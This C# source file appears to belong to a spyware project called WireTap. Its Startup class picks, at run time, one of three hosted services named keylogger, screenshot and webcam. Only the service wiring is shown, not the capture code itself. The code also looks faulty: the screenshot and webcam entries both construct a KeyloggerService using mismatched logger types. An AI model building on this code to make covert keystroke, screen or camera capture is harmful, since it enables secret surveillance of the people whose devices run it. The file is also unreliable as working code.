namespace WireTap.HostedService
{
    using Microsoft.Extensions.DependencyInjection;
    using System;
    using System.Collections.Generic;
    using WireTap.Logging;

    public static class Startup
    {
        private static class ServiceRegistrar
        {
            public static Dictionary<string, Action<IServiceCollection>> ServiceRegistrations;

            static ServiceRegistrar()
            {
                ServiceRegistrations = new Dictionary<string, Action<IServiceCollection>>
                {
                    {  "keylogger", services => services.AddHostedService(_ => new KeyloggerService(LogManager.GetLogger<KeyloggerService>()))   },
                    { "screenshot", services => services.AddHostedService(_ => new KeyloggerService(LogManager.GetLogger<ScreenshotService>()))  },
                    {     "webcam", services => services.AddHostedService(_ => new KeyloggerService(LogManager.GetLogger<WebcamService>()))      }
                };
            }
        }

        public static IServiceCollection ConfigureServices(this IServiceCollection services)
        {
            services.AddHostedService();
            services.AddSingleton(typeof(ILogger<>), typeof(Logger<>));

            return services;
        }

        public static IServiceCollection AddHostedService(this IServiceCollection services)
        {
            var serviceRegistration = ServiceRegistrar.ServiceRegistrations[Program.ServiceName];
            serviceRegistration(services);

            return services;
        }
    }
}